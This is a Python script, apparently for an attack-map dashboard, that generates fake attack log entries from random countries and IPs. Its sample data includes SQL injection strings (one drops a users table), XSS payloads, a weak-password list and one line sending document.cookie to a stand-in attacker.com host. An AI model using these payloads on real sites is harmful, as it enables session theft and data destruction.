from faker import Faker
import random
from datetime import datetime
from backend.models.models import AttackLog
import json

fake = Faker()

COUNTRIES = [
    {"name": "USA", "lat": 37.0902, "lng": -95.7129},
    {"name": "Russia", "lat": 61.5240, "lng": 105.3188},
    {"name": "China", "lat": 35.8617, "lng": 104.1954},
    {"name": "Brazil", "lat": -14.2350, "lng": -51.9253},
    {"name": "Germany", "lat": 51.1657, "lng": 10.4515},
    {"name": "India", "lat": 20.5937, "lng": 78.9629},
    {"name": "North Korea", "lat": 40.3399, "lng": 127.5101},
    {"name": "Israel", "lat": 31.0461, "lng": 34.8516},
    {"name": "UK", "lat": 55.3781, "lng": -3.4360},
    {"name": "Iran", "lat": 32.4279, "lng": 53.6880}
]

ATTACK_TYPES = ["SQL Injection", "Brute Force", "XSS"]

SQL_PAYLOADS = [
    "SELECT * FROM users WHERE id = 1 OR 1=1",
    "admin' --",
    "'; DROP TABLE users; --",
    "UNION SELECT username, password FROM users",
    "OR '1'='1' --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "'; document.location='http://attacker.com/steal?c='+document.cookie; //"
]

BRUTE_FORCE_PAYLOADS = [
    "password123", "admin123", "123456", "qwerty", "supersecret"
]

def generate_random_attack():
    attack_type = random.choice(ATTACK_TYPES)
    country_data = random.choice(COUNTRIES)
    ip = fake.ipv4()
    
    if attack_type == "SQL Injection":
        payload = random.choice(SQL_PAYLOADS)
    elif attack_type == "XSS":
        payload = random.choice(XSS_PAYLOADS)
    else:
        payload = f"login_attempt: {random.choice(BRUTE_FORCE_PAYLOADS)}"
    
    timestamp = datetime.utcnow()
    # Format: [Timestamp] IP - "POST /login HTTP/1.1" 401 "payload"
    status_code = random.choice([200, 401, 403, 404, 500])
    raw_log = f"[{timestamp.strftime('%Y-%m-%d %H:%M:%S')}] {ip} - \"POST /api/gate HTTP/1.1\" {status_code} \"{payload}\""
    
    return {
        "source_ip": ip,
        "country": country_data["name"],
        "latitude": country_data["lat"],
        "longitude": country_data["lng"],
        "attack_type": attack_type,
        "payload": payload,
        "raw_log": raw_log
    }
